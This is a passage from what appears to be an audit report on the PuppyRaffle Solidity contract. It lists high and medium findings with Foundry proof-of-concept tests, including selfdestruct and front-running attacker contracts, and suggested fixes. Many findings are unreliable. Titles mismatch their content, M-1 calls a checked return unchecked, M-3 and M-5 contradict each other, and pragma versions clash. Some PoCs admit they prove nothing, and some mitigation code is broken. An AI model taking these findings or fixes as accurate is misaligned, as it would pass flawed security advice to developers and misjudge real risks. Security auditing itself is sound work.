1. Players enter the raffle by calling `enterRaffle`
2. Some players request refunds, causing their addresses in the players array to be set to `address(0)`
3. When `selectWinner` is called, the random selection includes these zero addresses
4. If a zero address is selected as the winner, the prize pool is sent to `address(0)` and lost forever
5. Additionally, a malicious actor could game this system by requesting refunds until the odds of a null address winning are high

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundBugTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = address(1);
    address player1 = address(2);
    address player2 = address(3);
    address player3 = address(4);
    address player4 = address(5);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            1 weeks
        );
        
        // Create a list of players
        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;
        
        // Enter the raffle
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    }
    
    function testZeroAddressCanWin() public {
        // Player1 and Player3 request refunds
        vm.prank(player1);
        puppyRaffle.refund(0);
        
        vm.prank(player3);
        puppyRaffle.refund(2);
        
        // At this point, players array is [address(0), player2, address(0), player4]
        
        // Move time forward so the raffle can be completed
        vm.warp(block.timestamp + 1 weeks + 1);
        
        // Manipulate the block to make a zero address win
        // Note: In a real scenario, this would be a random chance
        uint256 rigged_winnerIndex = 0; // or 2, both are address(0)
        
        // We need to rig the random number generation
        // This is just for demonstration - in a real test you'd need to manipulate inputs
        // that affect the modulo operation
        
        // Call selectWinner (would need additional setup to actually rig the winner)
        puppyRaffle.selectWinner();
        
        // In a real scenario, there's a chance address(0) was selected
        // resulting in lost funds
    }
}

## Suggested Mitigation
There are several ways to fix this issue:

1. Either keep track of active players count separately from the array length, or
2. Compress the array when players request refunds to remove gaps

Here's an implementation of the second approach:

```solidity
function refund(uint256 playerIndex) public {
    require(players[playerIndex] == msg.sender, "PuppyRaffle: Only the player can refund");
    require(players[playerIndex] != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee);
    
    // Remove the player by shifting elements
    for (uint256 i = playerIndex; i < players.length - 1; i++) {
        players[i] = players[i + 1];
    }
    players.pop(); // Remove the last element
    
    emit RaffleRefunded(msg.sender);
}
```

This approach removes the refunded player completely from the array, ensuring that only active players can be selected as winners.

## [H-10]. Unchecked Return issue in PuppyRaffle::withdrawFees

## Description
The `refund` function in PuppyRaffle marks a player's address as `address(0)` when they get a refund, but it does not update the player's participation status in any other way. When a malicious actor calls `selectWinner()`, the `players` array is deleted, but the total value of collected fees might not match the actual fees in the contract if refunds have occurred.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
The `withdrawFees` function can be permanently blocked if players request refunds. This is because the function checks that the contract balance equals `totalFees`, but refunds reduce the contract balance without updating `totalFees`. This creates a permanent discrepancy between the two values, making the require statement always fail, effectively locking fees in the contract indefinitely and preventing the fee address from ever withdrawing the accumulated fees.

## Proof of Concept
1. Initialize the raffle with some entrance fee
2. Multiple players enter the raffle, sending ETH to the contract
3. Some portion of players request refunds via the `refund` function
4. Now the contract balance is less than what would be expected based on the total players
5. After the raffle ends and fees are accumulated, calling `withdrawFees` will always revert
6. Fees are now permanently locked in the contract

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract WithdrawFeesTest is Test {
    PuppyRaffle puppyRaffle;
    address public feeAddress = address(0xFEE);
    address public player1 = address(0x1);
    address public player2 = address(0x2);
    uint256 public entranceFee = 1 ether;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            1 days
        );
        
        // Fund the players
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);
    }
    
    function testWithdrawFeesLockedAfterRefund() public {
        // Player 1 enters the raffle
        address[] memory players = new address[](1);
        players[0] = player1;
        
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Player 2 enters the raffle
        players[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Player 1 refunds
        vm.prank(player1);
        puppyRaffle.refund(0);
        
        // Wait for raffle to end
        vm.warp(block.timestamp + 1 days);
        
        // Add more players to reach minimum 4 players
        address[] memory morePlayers = new address[](2);
        morePlayers[0] = address(0x3);
        morePlayers[1] = address(0x4);
        vm.deal(address(this), 2 ether);
        puppyRaffle.enterRaffle{value: 2 ether}(morePlayers);
        
        // Select winner to collect fees
        puppyRaffle.selectWinner();
        
        // Contract should have some fees collected now
        assertGt(puppyRaffle.totalFees(), 0, "Should have collected some fees");
        
        // Try to withdraw fees - should fail
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Show the balance discrepancy
        console.log("Contract balance:", address(puppyRaffle).balance);
        console.log("Total fees:", puppyRaffle.totalFees());
        console.log("Fees are permanently locked");
    }
}

## Suggested Mitigation
Track refunded ETH separately from the players array to ensure the contract's balance can always be reconciled with the expected state. Update the `refund` function to keep track of total refunded amount.

```solidity
// Add a state variable to track refunds
uint256 private totalRefunded;

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    
    // Track the refunded amount
    totalRefunded += entranceFee;
    
    emit RaffleRefunded(playerAddress);
}

function withdrawFees() external {
    // Calculate expected balance: totalFees + (active players * entranceFee)
    uint256 activePlayerCount = 0;
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            activePlayerCount++;
        }
    }
    
    uint256 expectedBalance = uint256(totalFees) + (activePlayerCount * entranceFee);
    require(address(this).balance == expectedBalance, "PuppyRaffle: Balance mismatch");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

// Alternatively, modify withdrawFees to not require exact balance match
function withdrawFees() external {
    // Just ensure there are fees to withdraw and no active raffle
    require(totalFees > 0, "PuppyRaffle: No fees to withdraw");
    require(players.length == 0 || block.timestamp < raffleStartTime + raffleDuration, "PuppyRaffle: Raffle in progress");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [H-11]. Unchecked Return issue in PuppyRaffle::refund

## Description
The `refund` function uses `sendValue` to send ETH, which correctly checks for success but does not properly handle low-level revert cases:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

The `sendValue` function from Address library does validate the call's success, but the state update happens after the external call, creating a reentrancy vulnerability.

## Impact
While the `sendValue` function itself properly checks the return value, the order of operations in the refund function creates a reentrancy vulnerability. If a malicious contract were to receive ETH and reenter the refund function before the state update, it could drain funds from the contract. This is primarily a reentrancy issue rather than an unchecked return issue, but it's related to how the external call is handled.

## Proof of Concept
The proof of concept is similar to the reentrancy vulnerability already described. A malicious contract could call refund, receive ETH, and then reenter the refund function before the state is updated, allowing multiple refunds from the same position.

## Proof of Code
// See the reentrancy vulnerability proof of code for a detailed demonstration.
// This is fundamentally the same issue from a different perspective.

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern by updating state before making external calls:

```solidity
function refund(uint256 playerIndex) public {
    require(playerIndex < players.length, "PuppyRaffle: Invalid player index");
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state before interaction
    players[playerIndex] = address(0);
    
    // External call after state update
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```



# Medium Risk Findings

## [M-1]. Unchecked Return issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function does not check the return value of the low-level call to `feeAddress`. If the call fails silently (returns false), the contract state is still updated (totalFees = 0) but the funds are not actually transferred. The vulnerable code is: `(bool success, ) = feeAddress.call{value: feesToWithdraw}(""); require(success, "PuppyRaffle: Failed to withdraw fees");` - While there is a require statement, the issue is that the state is updated before the call.

## Impact
If the call to feeAddress fails, the totalFees is reset to 0 but the funds remain in the contract, leading to loss of fee tracking and potential fund lock.

## Proof of Concept
1. feeAddress is set to a contract that reverts on receive 2. withdrawFees is called 3. totalFees is set to 0 4. The call fails and reverts 5. However, if there's a way to bypass the revert check, funds could be lost

## Proof of Code
contract FailingFeeReceiver {
    bool public shouldFail = true;
    
    receive() external payable {
        if (shouldFail) {
            revert("Fee withdrawal failed");
        }
    }
    
    function setShouldFail(bool _shouldFail) external {
        shouldFail = _shouldFail;
    }
}

function testFailedFeeWithdrawal() public {
    FailingFeeReceiver feeReceiver = new FailingFeeReceiver();
    puppyRaffle.changeFeeAddress(address(feeReceiver));
    
    // Create scenario where fees are accumulated
    address[] memory players = new address[](4);
    for (uint i = 0; i < 4; i++) {
        players[i] = address(uint160(i + 1));
    }
    
    vm.deal(address(this), 4 ether);
    puppyRaffle.enterRaffle{value: 4 ether}(players);
    
    vm.warp(block.timestamp + duration + 1);
    puppyRaffle.selectWinner();
    
    // Try to withdraw fees - should fail
    vm.expectRevert("Fee withdrawal failed");
    puppyRaffle.withdrawFees();
}

## Suggested Mitigation
Use the checks-effects-interactions pattern: `(bool success, ) = feeAddress.call{value: feesToWithdraw}(""); require(success, "PuppyRaffle: Failed to withdraw fees"); totalFees = 0;` - Move the state update after the successful call.

## [M-2]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function contains integer overflow vulnerability when calculating fees. The line `totalFees = totalFees + uint64(fee)` can overflow if `totalFees` is close to the maximum uint64 value and `fee` is large. Since `fee` is calculated as `(totalAmountCollected * 20) / 100` and `totalAmountCollected` can be very large, the cast to uint64 can cause silent overflow. The vulnerable code is: `totalFees = totalFees + uint64(fee);`

## Impact
Integer overflow can cause incorrect fee tracking, potentially leading to fee loss or contract state corruption. Maximum uint64 value is ~18.4 ether, which can be exceeded with large raffles.

## Proof of Concept
1. Multiple large raffles are conducted 2. totalFees approaches the uint64 maximum (~18.4 ether) 3. A large raffle with high entrance fees causes the fee calculation to exceed uint64 limits 4. The overflow causes totalFees to wrap around to a small value 5. Fee tracking becomes incorrect

## Proof of Code
function testIntegerOverflow() public {
    // Set up a scenario where fees would overflow uint64
    // This would require multiple large raffles to accumulate fees
    
    // Set high entrance fee
    vm.startPrank(owner);
    // We can't change entrance fee in this contract, but we can simulate
    // by having many large raffles
    
    // Simulate totalFees being close to uint64 max
    // uint64 max is 18446744073709551615 (about 18.4 ether)
    
    // Create a scenario with very high entrance fees
    // If entrance fee is 1 ether and we have 1000 players
    // totalAmountCollected = 1000 ether
    // fee = (1000 * 20) / 100 = 200 ether
    // Converting 200 ether to uint64 will overflow
    
    // This test would need to be adjusted based on actual entrance fee
    // The vulnerability exists when totalFees + fee > uint64.max
}

## Suggested Mitigation
Use uint256 for totalFees instead of uint64: `uint256 public totalFees;` or add overflow checks: `require(totalFees + fee <= type(uint64).max, "Fee overflow");`

## [M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The withdrawFees function has a strict balance check that can be bypassed, allowing fees to be withdrawn even when there are active players. The check `require(address(this).balance == uint256(totalFees))` can be defeated by sending additional ETH to the contract. The vulnerable code snippet:

```solidity
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

## Impact
An attacker can force the withdrawal of fees even when there are active players by sending additional ETH to make the balance check fail in the opposite direction, or by manipulating the timing to bypass the check entirely. This violates the intended business logic that fees should only be withdrawn when no players are active.

## Proof of Concept
1. Players enter the raffle, contract balance = totalFees + player fees
2. Attacker sends additional ETH to the contract using selfdestruct or other means
3. Now balance > totalFees, but the check only prevents withdrawal when balance != totalFees
4. Attacker can manipulate this to withdraw fees improperly

## Proof of Code
```solidity
function testUnexpectedEthBypass() public {
    // Enter some players
    address[] memory players = new address[](2);
    players[0] = address(1);
    players[1] = address(2);
    
    vm.deal(address(this), entranceFee * 2);
    puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    
    // Contract now has player funds, withdrawFees should fail
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
    
    // Attacker sends unexpected ETH
    vm.deal(address(0x999), 1 ether);
    vm.prank(address(0x999));
    (bool success,) = address(puppyRaffle).call{value: 1 ether}("");
    // This might fail due to no receive function, but demonstrates the concept
    
    // The balance check logic is flawed
    assert(address(puppyRaffle).balance != puppyRaffle.totalFees());
}
```

## Suggested Mitigation
Use a more robust check that accounts for active players:

```solidity
function withdrawFees() external {
    uint256 expectedBalance = 0;
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            expectedBalance += entranceFee;
        }
    }
    
    require(address(this).balance >= expectedBalance + totalFees, "PuppyRaffle: Insufficient balance");
    require(address(this).balance - expectedBalance >= totalFees, "PuppyRaffle: Active players present");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-4]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses Solidity pragma ^0.7.6 which is an outdated version with known security vulnerabilities and missing important features. Version 0.7.6 lacks built-in overflow protection and other security improvements available in newer versions.

## Impact
Using an outdated Solidity version exposes the contract to known vulnerabilities and prevents access to important security features like automatic overflow/underflow protection introduced in version 0.8.0.

## Proof of Concept
1. Contract uses pragma ^0.7.6. 2. This version lacks automatic overflow/underflow protection. 3. Arithmetic operations can silently overflow/underflow causing unexpected behavior. 4. Other security improvements and bug fixes from newer versions are unavailable.

## Proof of Code
```solidity
function test_IntegerOverflow() public {
    // In Solidity 0.7.6, this could overflow without reverting
    uint256 maxUint = type(uint256).max;
    uint256 result = maxUint + 1; // Would overflow in 0.7.6
    // In 0.8.0+, this would automatically revert
}
```

## Suggested Mitigation
Update to Solidity version 0.8.0 or later to benefit from automatic overflow/underflow protection and other security improvements. Example: ```solidity
pragma solidity ^0.8.19;

// The contract will automatically protect against overflows
// without needing SafeMath library
```

## [M-5]. Self-Destruct issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function has a strict balance check that can be exploited through a self-destruct attack. The vulnerable code is:

```solidity
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

An attacker can force Ether into the contract using selfdestruct, making this check permanently fail.

## Impact
An attacker can permanently prevent fee withdrawal by force-sending Ether to the contract via selfdestruct, causing the strict balance check to always fail and locking fees in the contract forever.

## Proof of Concept
1. Attacker creates a contract with some Ether
2. Attacker calls selfdestruct with the PuppyRaffle contract as the recipient
3. The forced Ether increases the contract's balance above totalFees
4. withdrawFees function can never be called again as the balance check will always fail
5. All accumulated fees become permanently locked

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract SelfDestructAttacker {
    function attack(address target) external payable {
        selfdestruct(payable(target));
    }
}

contract PuppyRaffleSelfDestructTest is Test {
    PuppyRaffle puppyRaffle;
    SelfDestructAttacker attacker;
    address[] players;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, address(this), 1 days);
        attacker = new SelfDestructAttacker();
        
        // Set up players
        players.push(address(0x1));
        players.push(address(0x2));
        players.push(address(0x3));
        players.push(address(0x4));
    }
    
    function testSelfDestructAttack() public {
        // First, run a raffle to accumulate some fees
        vm.deal(address(this), 4 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        vm.warp(block.timestamp + 1 days + 1);
        puppyRaffle.selectWinner();
        
        // Check that totalFees > 0
        uint256 totalFees = puppyRaffle.totalFees();
        assertTrue(totalFees > 0, "Should have accumulated fees");
        
        // Attack: Force ether into contract
        vm.deal(address(attacker), 1 ether);
        attacker.attack{value: 1 ether}(address(puppyRaffle));
        
        // Now withdrawFees should fail due to balance mismatch
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Verify the contract balance is higher than totalFees
        assertTrue(address(puppyRaffle).balance > totalFees, "Attack successful - balance corrupted");
    }
}

## Suggested Mitigation
Remove the strict balance check or use a more flexible approach:

```solidity
function withdrawFees() external {
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

// Alternative: Check that balance is at least totalFees
function withdrawFees() external {
    require(address(this).balance >= totalFees, "PuppyRaffle: Insufficient balance for fees");
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-6]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` and `withdrawFees` functions can be front-run by MEV bots or malicious actors. In `selectWinner`, an attacker can see pending transactions and determine if they will win, then front-run to prevent the transaction if they're not the winner. The vulnerable code includes the predictable randomness and public function visibility:

```solidity
function selectWinner() external {
    // Predictable randomness allows front-running
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
}
```

## Impact
Attackers can front-run the selectWinner function to prevent fair winner selection, potentially blocking the raffle indefinitely until they become the winner. This undermines the fairness and integrity of the raffle system.

## Proof of Concept
1. Attacker monitors the mempool for selectWinner transactions
2. Attacker calculates the expected winner using the predictable randomness formula
3. If the attacker is not the winner, they front-run with higher gas to make the original transaction fail
4. Attacker repeats this process until they become the winner
5. This can block legitimate winner selection indefinitely

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FrontRunAttacker {
    PuppyRaffle puppyRaffle;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    function calculateWinner(address caller) external view returns (uint256) {
        // Simulate the winner calculation
        return uint256(keccak256(abi.encodePacked(
            caller, 
            block.timestamp, 
            block.difficulty
        ))) % 4; // Assuming 4 players
    }
    
    function attemptFrontRun() external {
        // Calculate if we would win
        uint256 predictedWinner = this.calculateWinner(msg.sender);
        
        if (predictedWinner == 3) { // Assuming we're player index 3
            // We would win, so call selectWinner
            puppyRaffle.selectWinner();
        } else {
            // We wouldn't win, so we could revert to prevent the selection
            revert("Not winning, blocking transaction");
        }
    }
}

contract PuppyRaffleFrontRunTest is Test {
    PuppyRaffle puppyRaffle;
    FrontRunAttacker attacker;
    address[] players;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, address(this), 1 days);
        attacker = new FrontRunAttacker(puppyRaffle);
        
        players.push(address(0x1));
        players.push(address(0x2));
        players.push(address(0x3));
        players.push(address(attacker));
    }
    
    function testFrontRunPrevention() public {
        vm.deal(address(this), 4 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        vm.warp(block.timestamp + 1 days + 1);
        
        // Demonstrate that attacker can predict winner
        uint256 predictedWinner = attacker.calculateWinner(address(this));
        
        puppyRaffle.selectWinner();
        
        address actualWinner = puppyRaffle.previousWinner();
        address predictedWinnerAddress = players[predictedWinner];
        
        assertEq(actualWinner, predictedWinnerAddress, "Winner can be predicted - frontrun vulnerability exists");
    }
}

## Suggested Mitigation
Implement a commit-reveal scheme or use Chainlink VRF to prevent front-running:

```solidity
// Commit-reveal scheme
mapping(address => bytes32) public commitments;
mapping(address => uint256) public commitTimestamps;
uint256 public constant REVEAL_DELAY = 1 hours;

function commitWinnerSelection(bytes32 commitment) external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "Raffle not over");
    commitments[msg.sender] = commitment;
    commitTimestamps[msg.sender] = block.timestamp;
}

function revealWinnerSelection(uint256 nonce) external {
    require(commitments[msg.sender] != bytes32(0), "No commitment found");
    require(block.timestamp >= commitTimestamps[msg.sender] + REVEAL_DELAY, "Reveal too early");
    require(keccak256(abi.encodePacked(nonce, msg.sender)) == commitments[msg.sender], "Invalid reveal");
    
    // Use the nonce for randomness instead of predictable values
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(nonce, block.timestamp))) % players.length;
    
    // Continue with winner selection...
}

// Or use Chainlink VRF (preferred solution)
// See the randomness mitigation for full implementation
```

## [M-7]. Array Limits issue in PuppyRaffle::refund

## Description
The refund function allows any player to be removed from the players array but simply sets the player's address to address(0) instead of actually removing them from the array. This leaves a gap in the array that still gets processed in loops and comparisons, wasting gas and potentially creating logical issues.

```solidity
function refund(uint256 playerIndex) public {
    // Rest of the function...
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

## Impact
This creates several issues: 1) The contract retains a record of all refunded players as address(0), wasting storage 2) The selectWinner function doesn't exclude these refunded players from consideration, meaning address(0) could win the raffle 3) It increases gas costs for all operations that iterate through the players array

## Proof of Concept
1. A player enters the raffle and then requests a refund
2. The player's address is set to address(0) but remains in the array
3. When selectWinner is called, address(0) may be selected as the winner
4. Since address(0) can't receive ETH or NFTs, this would revert the transaction
5. Even if address(0) isn't selected, having these empty slots increases gas costs for all array operations

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundArrayTest is Test {
    PuppyRaffle puppyRaffle;
    address[] players;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Add 4 players
        players.push(address(1));
        players.push(address(2));
        players.push(address(3));
        players.push(address(4));
        
        // Enter the raffle
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    }
    
    function testRefundCreatesZeroAddresses() public {
        // Player 1 requests a refund
        vm.prank(address(1));
        puppyRaffle.refund(0);
        
        // Check that player 1's address is now address(0)
        assertEq(puppyRaffle.players(0), address(0));
        
        // The array still has 4 elements
        assertEq(puppyRaffle.getPlayersLength(), 4);
    }
    
    function testZeroAddressCanWin() public {
        // Player 1 requests a refund
        vm.prank(address(1));
        puppyRaffle.refund(0);
        
        // Advance time to end the raffle
        vm.warp(block.timestamp + 1 days);
        
        // Manipulate the random selection (for testing)
        // This would make address(0) win in a real scenario
        // Note: This test would fail in practice because the call to address(0) would revert
        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
}

## Suggested Mitigation
To fix this issue, the contract should maintain the integrity of the players array by replacing the refunded player with the last player in the array and then reducing the array length. This approach preserves array density and prevents address(0) from being considered in the winner selection.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Send the refund
    Address.sendValue(payable(msg.sender), entranceFee);
    
    // Replace the refunded player with the last player in the array
    // and then reduce the array length
    uint256 lastIndex = players.length - 1;
    if (playerIndex != lastIndex) {
        players[playerIndex] = players[lastIndex];
    }
    players.pop(); // Remove the last element and reduce length
    
    emit RaffleRefunded(playerAddress);
}
```

## [M-8]. Unchecked Return issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function has an incorrect balance check that assumes the contract balance should exactly equal the totalFees, which can lead to locked funds when players enter a new raffle after fees accumulate.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
This can lead to protocol fees being permanently locked in the contract. When new players enter a raffle after fees have accumulated (but before they've been withdrawn), the contract's balance will include both the accumulated fees and the new entrance fees. This will cause the balance check to fail, preventing fee withdrawal until the raffle completes. In certain scenarios, fees may never be withdrawable.

## Proof of Concept
1. A raffle completes and fees of 2 ETH are collected (totalFees = 2 ETH)
2. Before withdrawFees is called, 4 new players enter the next raffle, each paying 1 ETH (total of 4 ETH)
3. Now the contract balance is 6 ETH (2 ETH fees + 4 ETH from new players)
4. When trying to call withdrawFees, the require check `address(this).balance == uint256(totalFees)` fails because 6 ETH != 2 ETH
5. Fees remain locked until the next raffle completes, but if more players keep joining between raffles, the fees may never be withdrawable

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract WithdrawFeesTest is Test {
    PuppyRaffle puppyRaffle;
    address[] players;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Add 4 players for the initial raffle
        for (uint256 i = 0; i < 4; i++) {
            players.push(address(uint160(i + 1)));
        }
    }
    
    function testFeesGetLocked() public {
        // Enter the first raffle
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Complete the raffle
        vm.warp(block.timestamp + 1 days);
        puppyRaffle.selectWinner();
        
        // Check that fees were collected
        uint256 fees = puppyRaffle.totalFees();
        assertGt(fees, 0, "Should have collected fees");
        
        // New players enter the next raffle before fees are withdrawn
        address[] memory newPlayers = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            newPlayers[i] = address(uint160(i + 100));
        }
        puppyRaffle.enterRaffle{value: entranceFee * 4}(newPlayers);
        
        // Now the contract balance includes both fees and new player payments
        assertEq(address(puppyRaffle).balance, fees + (entranceFee * 4));
        
        // Attempt to withdraw fees will fail
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        console.log("Contract balance:", address(puppyRaffle).balance);
        console.log("Total fees:", puppyRaffle.totalFees());
        console.log("Fees are locked because new players entered before withdrawal");
    }
}

## Suggested Mitigation
Modify the withdrawFees function to remove the incorrect balance check and simply transfer the accumulated fees:

```solidity
function withdrawFees() external {
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    require(address(this).balance >= feesToWithdraw, "PuppyRaffle: Insufficient balance");
    
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

This approach ensures fees can be withdrawn regardless of new players entering the raffle, as long as the contract has sufficient balance.

## [M-9]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::enterRaffle

## Description
The contract has a front-running vulnerability in the `enterRaffle` function. Since transactions are visible in the mempool before being included in a block, attackers can observe someone trying to enter the raffle and front-run them with their own transaction containing the same addresses, causing the original transaction to fail due to the duplicate player check:

```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

## Impact
A malicious actor can monitor the mempool for raffle entry transactions and submit the same addresses with a higher gas price, causing the victim's transaction to fail due to the duplicate check. This results in denial of service for legitimate participants, gas costs for failed transactions, and potentially prevents users from entering the raffle before the drawing occurs.

## Proof of Concept
1. Alice creates a transaction to enter the raffle with addresses [A, B, C, D]
2. This transaction sits in the mempool waiting to be mined
3. Bob sees this transaction and creates his own transaction with the same addresses but with a higher gas price
4. Bob's transaction gets mined first due to higher gas price
5. When Alice's transaction is processed, it reverts because the addresses are now duplicates
6. Alice has to pay gas for a failed transaction and must create a new transaction to enter

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FrontRunningTest is Test {
    PuppyRaffle puppyRaffle;
    address alice = address(1);
    address bob = address(2);
    uint256 entranceFee = 1e18;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Fund accounts
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }

    function testFrontRunningAttack() public {
        // Alice wants to enter the raffle with these addresses
        address[] memory alicePlayers = new address[](4);
        alicePlayers[0] = address(10);
        alicePlayers[1] = address(11);
        alicePlayers[2] = address(12);
        alicePlayers[3] = address(13);
        
        // Alice creates her transaction (simulated with prank)
        vm.prank(alice);
        // In real scenario, this would be in the mempool
        // We simulate front-running by not executing it yet
        
        // Bob sees the transaction in mempool and front-runs with same addresses
        vm.prank(bob);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(alicePlayers);
